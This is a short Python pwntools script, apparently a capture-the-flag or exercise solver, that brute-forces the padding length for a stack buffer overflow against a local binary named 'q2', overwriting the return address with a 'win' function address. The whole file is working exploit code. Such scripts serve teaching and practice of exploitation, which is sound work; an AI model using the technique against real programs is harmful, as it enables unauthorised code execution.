#!/usr/bin/env python

from pwn import *
for i in range(50):
	p = process('./q2')
	win = 0x0000000000400831
	payload = ''
	payload+= 'A'*i
	payload+= p64(win)
	print i
	p.sendline(payload)
	try:
		p.recv()
	except:
		print 'no'
	p.kill()